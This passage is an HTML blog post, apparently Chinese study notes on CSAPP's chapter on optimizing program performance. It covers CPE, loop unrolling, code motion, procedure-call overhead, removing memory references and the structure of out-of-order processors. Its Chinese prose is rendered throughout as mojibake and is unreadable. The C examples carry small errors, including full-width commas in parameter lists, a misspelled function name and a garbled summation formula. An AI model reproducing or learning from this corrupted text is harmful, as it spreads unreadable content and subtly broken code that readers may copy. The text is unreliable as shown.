çš„å‘¨æœŸæ•° (Cycles Per Elementï¼ŒCPE)</strong> ï¼Œä½œä¸ºä¸€ç§è¡¨ç¤ºç¨‹åºæ€§èƒ½å¹¶æŒ‡å¯¼æˆ‘ä»¬æ”¹è¿›ä»£ç çš„æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬çŸ¥é“å¤„ç†å™¨æ´»åŠ¨çš„é¡ºåºæ˜¯ç”±æ—¶é’Ÿæ§åˆ¶çš„ï¼Œåº¦é‡æ ‡å‡†æŒ‡çš„å°±æ˜¯æ¯ä¸ªæŒ‡ä»¤æ‰§è¡Œéœ€è¦å¤šå°‘ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„å‡½æ•° <code>psum1()</code> å’Œ <code>psum2()</code> éƒ½æ˜¯è®¡ç®—é•¿åº¦ä¸º n çš„å‘é‡ <code>a = âŸ¨ a0, a1, a2, Â·Â·Â·, an-1 âŸ©</code>çš„å‰ç½®å’Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compute prefix sum of vector a */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">psum1</span><span class="hljs-params">(<span class="hljs-type">float</span> a[], <span class="hljs-type">float</span> p[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i; <br>    p[<span class="hljs-number">0</span>] = a[<span class="hljs-number">0</span>]; <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">1</span>; i&lt;n; i++)<br>        p[i] = p[i<span class="hljs-number">-1</span>] + a[i];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">psum2</span><span class="hljs-params">(<span class="hljs-type">float</span> a[], <span class="hljs-type">float</span> p[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i; <br>    p[<span class="hljs-number">0</span>] = a[<span class="hljs-number">0</span>]; <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; n<span class="hljs-number">-1</span>; i+=<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">float</span> mid_val = p[i<span class="hljs-number">-1</span>] + a[i]; <br>        p[i]= mid_val; <br>        p[i+<span class="hljs-number">1</span>] =mid_val + a[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-comment">/* For even n, finish remaining element */</span><br>    <span class="hljs-keyword">if</span> (i&lt;n)<br>        p[i] = p[i<span class="hljs-number">-1</span>] + a[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•° <code>psum1()</code> æ¯æ¬¡è¿­ä»£è®¡ç®—ç»“æœæ•°åˆ—çš„ä¸€ä¸ªå…ƒç´ ã€‚å‡½æ•° <code>psum2()</code> ä½¿ç”¨<strong>å¾ªç¯å±•å¼€</strong>çš„æŠ€æœ¯ï¼Œæ¯æ¬¡è¿­ä»£è®¡ç®—ä¸¤ä¸ªå…ƒç´ ã€‚å®ƒä»¬çš„è¿è¡Œæ—¶é—´å¯ä»¥ç”¨ä¸€ä¸ªå¸¸æ•°åŠ ä¸Šä¸€ä¸ªè¢«å¤„ç†å…ƒç´ ä¸ªæ•°æˆæ­£æ¯”çš„å› å­æè¿°ã€‚ä¸‹å›¾å¯¹ä¸¤ä¸ªå‡½æ•°æŠŠ n å’Œå‘¨æœŸæ•°è¿›è¡Œæœ€å°äºŒä¹˜æ‹Ÿåˆï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%89%8D%E7%BD%AE%E5%92%8C.png"></p><blockquote><p>æœ€å°äºŒä¹˜æ‹Ÿåˆï¼š</p><p>å¯¹äºæ•°æ®ç‚¹çš„é›†åˆï¼Œæˆ‘ä»¬åˆ©ç”¨æœ€å°äºŒä¹˜æ‹Ÿåˆï¼Œæˆ‘ä»¬å°è¯•ç”»ä¸€æ¡å½¢å¦‚ y&#x3D;mx+b çš„çº¿ï¼Œä½¿ä¸‹é¢çš„è¿™ä¸ªè¯¯å·®åº¦æœ€å°<br>$$<br>\sum_{n&#x3D;1}^n (m_ix+b-y_i)^2<br>$$<br>å°† E(m,b) åˆ†åˆ«å¯¹ m å’Œ b æ±‚å¯¼ï¼ŒæŠŠä¸¤ä¸ªå¯¼æ•°å‡½æ•°è®¾ç½®ä¸º0ï¼Œè¿›è¡Œæ¨å¯¼å°±èƒ½å¾—å‡ºè®¡ç®— m å’Œ b çš„ç®—æ³•ã€‚</p></blockquote><p>æˆ‘ä»¬å‘ç°ï¼Œå¾ªç¯å±•å¼€çš„æ–¹å¼å¯ä»¥åŠ å¿«ç¨‹åºæ•ˆç‡ï¼Œå‡å°‘è®¿å­˜çš„æ¬¡æ•°ï¼Œè€Œè®¿å­˜å¾€å¾€æ˜¯è®¡ç®—æœºæ‰§è¡ŒæŒ‡ä»¤æ—¶æœ€è€—æ—¶é—´çš„ä¸€ä¸ªæŒ‡ä»¤ã€‚</p><p>åœ¨ <code>psum1()</code> ä¸­ï¼Œæ¯æ¬¡å¾ªç¯è¦è¿›è¡Œè¯» <code>p[i-1]</code> ï¼Œè¯» <code>a[i]</code>ï¼Œå†™ <code>p[i]</code> ä¸‰æ¬¡è®¿å­˜ã€‚è€Œåœ¨ <code>psum2()</code> ä¸­ï¼Œæˆ‘ä»¬æ¯æ¬¡å¾ªç¯æœ‰è¯» <code>p[i-1]</code> ï¼Œè¯» <code>a[i]</code>ï¼Œè¯» <code>a[i+1]</code>ï¼Œå†™ <code>p[i]</code> ï¼Œå†™ <code>p[i+1]</code>äº”æ¬¡è®¿å­˜ï¼Œä½†æ˜¯ <code>psum2()</code> ä¸€æ¬¡å¾ªç¯çš„æ“ä½œæ•°æ˜¯ <code>psum1()</code> çš„ä¸¤å€ï¼Œä¸”å‡å°‘äº†å¾ªç¯çš„æ¬¡æ•°ã€‚</p><p>åˆç”±äº <code>psum1()</code> å¾ªç¯æ¬¡æ•°å¤šï¼Œéœ€è¦æ›´å¤šçš„æ¡ä»¶è·³è½¬è¯­å¥ï¼Œè¿™æ ·å®ƒè¢« <code>n</code> å½±å“çš„å°±æ›´å¤šäº†ï¼Œç›¸æ¯”äºæ­¤ï¼Œ <code>psum2()</code> å°±ä¼˜åŒ–äº†è®¸å¤šã€‚</p><h1 id="ç¨‹åºç¤ºä¾‹"><a href="#ç¨‹åºç¤ºä¾‹" class="headerlink" title="ç¨‹åºç¤ºä¾‹"></a>ç¨‹åºç¤ºä¾‹</h1><p>æˆ‘ä»¬å£°æ˜ä¸€ä¸ªå‘é‡çš„æ•°æ®ç»“æ„ï¼šå¤´éƒ¨å’Œæ•°æ®æ•°ç»„</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%90%91%E9%87%8F%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png"></p><p>æˆ‘ä»¬åœ¨å››ä¸ªæ•°æ®ç±»å‹ä¸‹é¢åšæµ‹è¯•ï¼š<code>int</code>ï¼Œ<code>long</code>ï¼Œ<code>float</code>ï¼Œ<code>double</code>ã€‚åˆ†åˆ«å¯¹ä»–ä»¬è¿›è¡Œæ±‚å’Œå’Œæ±‚ç§¯çš„æ“ä½œæ¥æµ‹è¯•ç¨‹åºçš„ CPEã€‚</p><p>æœ€åæˆ‘ä»¬å¾—åˆ°äº†è¿™æ ·çš„ç»“æœï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%AF%B9%E6%AF%94%E7%BB%93%E6%9E%9C.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæœªç»ä¼˜åŒ–çš„ä»£ç æ•ˆç‡è¾ƒä½ï¼›ä½¿ç”¨å‘½ä»¤è¡Œé€‰é¡¹ â€œ-O1â€ï¼Œå°±ä¼šè¿›è¡Œä¸€äº›åŸºæœ¬çš„ä¼˜åŒ–ã€‚ç¨‹åºå‘˜ä¸éœ€è¦åšä»€ä¹ˆï¼Œå°±ä¼šæ˜¾è‘—åœ°æé«˜ç¨‹åºæ€§ã€‚</p><h1 id="æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡"><a href="#æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡" class="headerlink" title="æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡"></a>æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡</h1><p>ä¸€ä¸ªå¾ˆå¸¸è§çš„ä¾‹å­ï¼Œæˆ‘ä»¬æƒ³è¦é€ä¸ªå¤„ç†å­—ç¬¦ä¸² s çš„æ•°æ®ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šç”¨åˆ° <code>for (int i=0;i&lt;strlen(s);i++)</code> è¿™æ ·çš„è¯­å¥ï¼Œçœ‹ä¸Šå»æ²¡æœ‰ä»»ä½•çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘ä»¬æ¯æ¬¡å¾ªç¯ä¸­éƒ½è¦å»è®¡ç®—ä¸€æ¬¡ <code>strlen(s)</code> çš„å€¼ã€‚è€Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­æˆ‘ä»¬çš„sæ˜¯ä¸ä¼šå˜çš„ï¼Œ<code>strlen(s)</code> ä¹Ÿæ˜¯ä¸€ä¸ªå¸¸æ•°ã€‚åœ¨å¾ªç¯æ¬¡æ•°å¾ˆå¤§çš„ç¨‹åºä¸­å°±ä¼šç”±äºè¿™ä¸ªæ— ç”¨çš„è°ƒç”¨å¢åŠ ç¨‹åºçš„è¿è¡Œæ—¶é—´ã€‚</p><p>ä¼˜åŒ–æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠ <code>strlen(s)</code> è¿™æ¡å‘½ä»¤ç§»å‡ºå¾ªç¯ï¼Œå°±ä¼šä¸ºæ¯æ¬¡å¾ªç¯è¿‡ç¨‹å‡å°‘ä¸€æ¬¡è®¡ç®—æµç¨‹ï¼Œå˜æˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(s); <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„ä¼˜åŒ–ç§°ä¸º<strong>ä»£ç ç§»åŠ¨</strong>ï¼Œä¸ä¼šå¯¹ç¨‹åºé€ æˆæ˜æ˜¾çš„ CPE ä¸‹é™çš„å½±å“ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€å®šç¨‹åº¦ä¸Šçš„æ•ˆç‡çš„æå‡ã€‚</p><p>æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æŠŠä¹¦ä¸­5.3èŠ‚çš„combine1å‡½æ•°è¿›è¡Œä¼˜åŒ–ï¼Œæ¥ä¸‹æ¥çš„ç¤ºä¾‹ä¹Ÿä¼šç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">conbine2</span><span class="hljs-params">(vec_ptr v,<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length=vec_length(v);<br>    *dest=IDENT;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;length;i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v,i,&amp;val);<br>        *dest=*dest OP val;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆç±»çš„åŠŸèƒ½å®ç°ä»£ç å°±ä¸æŠ„äº†æˆ‘å¤ªæ‡’äº†ï¼‰</p><p>æˆ‘ä»¬éœ€è¦æ³¨æ„<strong>ä»£ç ç§»åŠ¨æ˜¯ä¸èƒ½ç”±ç¼–è¯‘å™¨æ¥å®Œæˆçš„</strong>ï¼Œå› ä¸ºç¼–è¯‘å™¨ä¼šæƒ³åˆ°æœ€å·®çš„æƒ…å†µæ¯”å¦‚å­—ç¬¦å‘ç”Ÿæ”¹å˜æˆ–è€…ä»éé›¶å˜æˆäº†é›¶ï¼Œè¿™ä¸ªé—®é¢˜ä»¥ç¼–è¯‘å™¨çš„èƒ½åŠ›æ˜¯æ— æ³•å¤„ç†çš„ï¼Œå¿…é¡»ç”±ç¨‹åºå‘˜æ¥è¿›è¡Œå¯¹åº”çš„ä¼˜åŒ–ã€‚</p><p>ç”±äºæˆ‘ä»¬æµ‹è¯•æ—¶ä½¿ç”¨çš„æ˜¯å°æ•°æ®é›†ï¼Œè€Œå®é™…åº”ç”¨ä¸­çš„æ•°æ®æ•°é‡æ˜¯æˆ‘ä»¬æ‰€ä¸èƒ½ä¼°è®¡çš„ï¼Œæ­¤æ—¶å°±ä¼šäº§ç”Ÿæ˜æ˜¾çš„å·®åˆ«ã€‚è¿™ä¹Ÿåæ˜ äº†ç¼–ç¨‹æ—¶çš„å¸¸è§é—®é¢˜â€”â€”ä¸€ä¸ªçœ‹ä¸Šå»æ— è¶³è½»é‡çš„ä»£ç ç‰‡æ–­æœ‰éšè—çš„æ¸è¿‘ä½æ•ˆç‡ï¼ˆasymptotic inefficiencyï¼‰ã€‚</p><h1 id="å‡å°‘è¿‡ç¨‹è°ƒç”¨"><a href="#å‡å°‘è¿‡ç¨‹è°ƒç”¨" class="headerlink" title="å‡å°‘è¿‡ç¨‹è°ƒç”¨"></a>å‡å°‘è¿‡ç¨‹è°ƒç”¨</h1><p>åƒæˆ‘ä»¬çœ‹åˆ°è¿‡çš„é‚£æ ·ï¼Œè¿‡ç¨‹è°ƒç”¨ä¼šå¸¦æ¥å¼€é”€ï¼Œè€Œä¸”å¦¨ç¢å¤§å¤šæ•°å½¢å¼çš„ç¨‹åºä¼˜åŒ–ã€‚</p><p>åœ¨ <code>combine()</code> å‡½æ•°ä¸­ï¼Œæ¯ä¸€æ¬¡å¾ªç¯è¿­ä»£éƒ½ä¼šè°ƒç”¨ä¸€æ¬¡ <code>get_vec_element()</code> æ¥è·å–ä¸‹ä¸€ä¸ªå‘é‡å…ƒç´ ã€‚å¯¹æ¯ä¸ªå‘é‡å¼•ç”¨ï¼Œè¿™ä¸ªå‡½æ•°è¦æŠŠå‘é‡ç´¢å¼• <code>i</code> ä¸å¾ªç¯è¾¹ç•Œåšæ¯”è¾ƒï¼Œå¾ˆæ˜æ˜¾ä¼šé€ æˆä½æ•ˆç‡ã€‚åœ¨å¤„ç†å…¶å®ƒä»»æ„çš„æ•°ç»„è®¿é—®æ—¶ï¼Œè¾¹ç•Œæ£€æŸ¥æ˜¯ä¸ªå¾ˆæœ‰ç”¨çš„ç‰¹æ€§ï¼Œä½†æ˜¯å¯¹ <code>combine()</code>  å‡½æ•°ä»£ç ï¼Œæ‰€æœ‰çš„å¼•ç”¨éƒ½æ˜¯åˆæ³•çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å»æ‰è¾¹ç•Œåˆ¤æ–­æ¥ç›´æ¥è®¿é—®å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">data_t</span> *<span class="hljs-title function_">get_vec_start</span><span class="hljs-params">(vec_ptr v)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> v-&gt;data;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine3</span><span class="hljs-params">(vec_ptr vï¼Œ<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br><span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>*dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i &lt; length; i++) <br>    &#123;<br>        *dest = *dest OP data[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•åä»¤æˆ‘ä»¬æ„å¤–çš„æ˜¯æ•ˆç‡å¹¶æ²¡æœ‰æ˜æ˜¾çš„æå‡ã€‚ä½†æ˜¯æˆ‘ä»¬å…ˆä¿ç•™è¿™ä¸ªä¼˜åŒ–ï¼Œå°†å®ƒè§†ä½œä¸€ä¸ªä¼˜åŒ–æ–¹å¼çš„å…¶ä¸­ä¸€æ­¥ï¼Œæœ‰è®¸å¤šæ­¥éª¤ç»„åˆå°†ä½¿ç¨‹åºçš„æ€§èƒ½æœ‰æ˜æ˜¾çš„æå‡ã€‚</p><h1 id="æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨"><a href="#æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨" class="headerlink" title="æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨"></a>æ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜å¼•ç”¨</h1><p>åœ¨ <code>combine3()</code> ä¸­ï¼Œæˆ‘ä»¬æ¯æ¬¡å¾ªç¯éƒ½ä¼šè°ƒç”¨æŒ‡é’ˆæ¥è®¿é—®å†…å­˜ã€‚ä¾‹å¦‚ <code>*dest = *dest OP data[i];</code>ï¼Œè¿™éƒ¨åˆ†çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L17<br>vmovsd (%rbx), %xmm0<br>vmulsd (%rbx), %xmm0,%xmm0<br>vmovsd %xmm0, (%rbx)<br>addq $8,%rdx<br>cmp %rax, %rdx<br>jne .L17<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‡é’ˆ dest è¢«å­˜å‚¨åœ¨ rdx ä¸­ï¼Œæˆ‘ä»¬æ¯æ¬¡éƒ½è¦å…ˆä»å†…å­˜è¯»å‡ºå†å†™å…¥å†…å­˜ã€‚ä½†å®é™…ä¸Šè¿™ä¸ªæ•°æ®æ˜¯ä¸å˜çš„ï¼Œæ¯æ¬¡è¿­ä»£å¼€å§‹çš„ dest æŒ‡å‘çš„æ•°å€¼å°±æ˜¯æœ€åå†™å…¥çš„å€¼ã€‚</p><p>æˆ‘ä»¬å°±å¯ä»¥ä¼˜åŒ–è¿™éƒ¨åˆ†å†…å®¹ï¼Œæ¶ˆé™¤ä¸å¿…è¦çš„å†…å­˜è¯»å†™ã€‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªä¸´æ—¶å˜é‡æ¥å­˜å‚¨ç´¯è®¡è®¡ç®—å‡ºæ¥çš„å€¼ï¼Œå¾ªç¯å¼€å§‹æ—¶è¯»å–å†…å­˜ï¼Œå¾ªç¯ç»“æŸæ—¶å†æ‰§è¡Œå†…å­˜çš„å†™æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">combine4</span><span class="hljs-params">(vec_ptr vï¼Œ<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br><span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br><span class="hljs-type">data_t</span> acc = IDENT;<br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i &lt; length; i++) <br>    &#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest=acc;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%B6%88%E9%99%A4%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%86%85%E5%AD%98%E5%BC%95%E7%94%A8.png"></p><p>æµ‹è¯•ç»“æœä¹æ„çœ‹å‡ºè¿™ä¸ªä¼˜åŒ–è®©æˆ‘ä»¬çš„æ•ˆç‡æœ‰äº†å¾ˆå¤§çš„æå‡ã€‚åŒè¿‡ç¨‹è°ƒç”¨ä¸€æ ·ï¼Œè¿™ä¸ªä¼˜åŒ–éƒ¨åˆ†ä¹Ÿéœ€è¦ç¨‹åºå‘˜æ¥è¿›è¡Œã€‚</p><p>å½“æˆ‘ä»¬ç”¨å‘½ä»¤è¡Œé€‰é¡¹ â€œ-O2â€ æ¥ç¼–è¯‘ <code>combine3()</code> ï¼Œæˆ‘ä»¬å‘ç°æ€§èƒ½è¿œè¿œä¼˜äºä½¿ç”¨ â€œ-O1â€ ã€‚æ­¤æ—¶å¾—åˆ°çš„æ€§èƒ½ä¸æˆ‘ä»¬åˆšæ‰ä¼˜åŒ–åçš„ <code>combine4()</code> ç›¸å½“ï¼Œä½†æ˜¯æ•´æ•°çš„è®¡ç®—ä»ä½äº  <code>combine4()</code> ã€‚æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹O1ã€O2çš„æ±‡ç¼–ä»£ç æ¥æ¢ç´¢ä¸€ä¸‹åŸå› ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-O2%E6%B1%87%E7%BC%96.png"></p><p>æˆ‘ä»¬å‘ç°O2çš„ä¼˜åŒ–ä¸­å°† <code>vmovsd (%rbx), %xmm0</code> è¿™å¥å†…å­˜è¯»å–çš„æŒ‡ä»¤ä¼˜åŒ–æ‰äº†ï¼Œä¹Ÿå°±ç›¸å½“äºè®¾å®šäº†ä¸€ä¸ªä¸´æ—¶å˜é‡ã€‚ç¼–è¯‘å™¨ä¸ºäº†é˜²æ­¢å’Œæºç¨‹åºæœ‰å·®å¼‚ï¼Œè¿˜æ˜¯ä¼šæ¯æ¬¡å¾ªç¯æ›´æ–° dest çš„å€¼çš„ï¼Œæ‰€ä»¥è¯´è¿™é‡Œçš„ä¼˜åŒ–æ¥è¿‘ <code>combine4()</code>ï¼Œä½†æ˜¯å’Œ <code>combine4()</code> æœ‰å·®è·ã€‚</p><h1 id="ç†è§£ç°ä»£å¤„ç†å™¨"><a href="#ç†è§£ç°ä»£å¤„ç†å™¨" class="headerlink" title="ç†è§£ç°ä»£å¤„ç†å™¨"></a>ç†è§£ç°ä»£å¤„ç†å™¨</h1><p>é™¤äº†ç¼–è¯‘ä¸Šçš„ä¼˜åŒ–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è€ƒè™‘åˆ©ç”¨å¤„ç†å™¨å¾®ä½“ç³»ç»“æ„çš„ä¼˜åŒ–ï¼Œä¹Ÿå°±æ˜¯å¤„ç†å™¨ç”¨æ¥æ‰§è¡ŒæŒ‡ä»¤çš„åº•å±‚ç³»ç»Ÿè®¾è®¡ã€‚</p><p>åœ¨å®é™…çš„å¤„ç†å™¨ä¸­ï¼Œæ˜¯åŒæ—¶å¯¹å¤šæ¡æŒ‡ä»¤æ±‚å€¼çš„ï¼Œè¿™ä¸ªç°è±¡ç§°ä¸ºæŒ‡ä»¤çº§å¹¶è¡Œã€‚å¤šæ¡æŒ‡ä»¤å¹¶è¡Œåœ°æ‰§è¡Œï¼ŒåŒæ—¶åˆå‘ˆç°å‡ºä¸€ç§ç®€å•çš„é¡ºåºæ‰§è¡ŒæŒ‡ä»¤çš„è¡¨è±¡ã€‚</p><p>ä»¥ä¸‹ä¸¤ç§å› ç´ é™åˆ¶ç¨‹åºçš„æœ€å¤§æ€§èƒ½ï¼š</p><ul><li>å»¶è¿Ÿç•Œé™ï¼šå½“ä¸€ç³»åˆ—æ“ä½œå¿…é¡»æŒ‰ç…§ä¸¥æ ¼é¡ºåºæ‰§è¡Œæ—¶ï¼ŒæŸä¸€æ¡æŒ‡ä»¤å¼€å§‹å‰ï¼Œä¸Šä¸€æ¡æŒ‡ä»¤å¿…é¡»ç»“æŸã€‚ä»£ç ä¸­çš„æ•°æ®ç›¸å…³æ€§ä¼šé™åˆ¶æŒ‡ä»¤çº§å¹¶è¡Œï¼Œç¨‹åºå—é™äºå»¶æ—¶ç•Œé™ã€‚</li><li>ååé‡ç•Œé™ï¼šå¤„ç†å™¨åŠŸèƒ½å•å…ƒçš„åŸå§‹è®¡ç®—èƒ½åŠ›ï¼Œæ˜¯ç¨‹åºæ€§èƒ½çš„ç»ˆæé™åˆ¶ã€‚</li></ul><h3 id="æ•´ä½“æ“ä½œ"><a href="#æ•´ä½“æ“ä½œ" class="headerlink" title="æ•´ä½“æ“ä½œ"></a>æ•´ä½“æ“ä½œ</h3><p>æˆ‘ä»¬å‡è±¡çš„å¤„ç†å™¨å¹¶ä¸ä¸¥æ ¼åœ°åŸºäºè¿‘æœŸçš„ Inter å¤„ç†å™¨çš„ç»“æ„ã€‚è¿™äº›å¤„ç†å™¨è¢«ç§°ä½œè¶…æ ‡é‡åˆæœŸé‡Œï¼Œå¯ä»¥åœ¨æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸæ‰§è¡Œå¤šä¸ªæ“ä½œï¼Œå¹¶ä¸”æ˜¯ä¹±åºçš„ï¼Œä¹Ÿå°±æ˜¯æŒ‡ä»¤çš„é¡ºåºä¸ä¸€å®šè¦ä¸å®ƒä»¬çš„æœºå™¨åŠç¨‹åºä¸­çš„é¡ºåºä¸€è‡´</p><p>å¤„ç†å™¨çš„è®¾è®¡æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>æŒ‡ä»¤æ§åˆ¶å•å…ƒ (ICU, instruction controll unit) ï¼šè´Ÿè´£ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤åºåˆ—ï¼Œç”Ÿæˆä¸€ç»„åŸºæœ¬æ“ä½œï¼Œå‘é€ç»™ EUã€‚</li><li>æ‰§è¡Œå•å…ƒ (EU, execution unit) ï¼šæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸæ¥æ”¶å¤šä¸ªæ“ä½œï¼Œæ‰§è¡Œæ“ä½œã€‚</li></ul><p>ä¸‹å›¾æ˜¯ç°ä»£å¤„ç†å™¨çš„ä¸€ä¸ªéå¸¸ç®€åŒ–çš„ç¤ºæ„å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E7%8E%B0%E4%BB%A3%E5%A4%84%E7%90%86%E5%99%A8.png"></p><p><strong>ICU ä»æŒ‡ä»¤é«˜é€Ÿç¼“å­˜ä¸­è¯»å–æŒ‡ä»¤</strong>ï¼ŒæŒ‡ä»¤é«˜é€Ÿç¼“å­˜æ˜¯ä¸ªç‰¹æ®Šçš„é«˜é€Ÿå­˜å‚¨å™¨ï¼Œå®ƒåŒ…å«ç€æœ€è¿‘è®¿é—®çš„æŒ‡ä»¤ã€‚é€šå¸¸ ICU ä¼šåœ¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤å¾ˆæ—©å‰å°±å–æŒ‡ï¼Œè¿™æ ·æ‰ä¼šæœ‰è¶³å¤Ÿçš„æ—¶é—´ç¼–è¯‘æŒ‡ä»¤ï¼Œå¹¶æŠŠæ“ä½œå‘é€åˆ° 